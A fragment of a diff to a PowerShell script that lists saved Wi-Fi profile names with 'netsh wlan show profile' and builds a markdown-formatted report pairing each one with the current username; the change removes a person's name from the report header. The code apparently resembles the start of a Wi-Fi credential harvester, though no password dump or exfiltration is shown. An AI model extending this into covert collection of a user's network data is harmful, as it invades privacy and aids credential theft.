@@ -1,4 +1,4 @@
-$nw="**Joan meloni**\r\n**Xarxes wifi:**\r\n";
+$nw="**Xarxes wifi:**\r\n";
 netsh wlan show profile | Select-String '(?<=Perfil de todos los usuarios\s+:\s).+' | ForEach-Object {
     $wlan  = $_.Matches.Value;
     $nw =$nw+"      "+ [string]$wlan +" => "+  [string]$env:username +"\r\n";
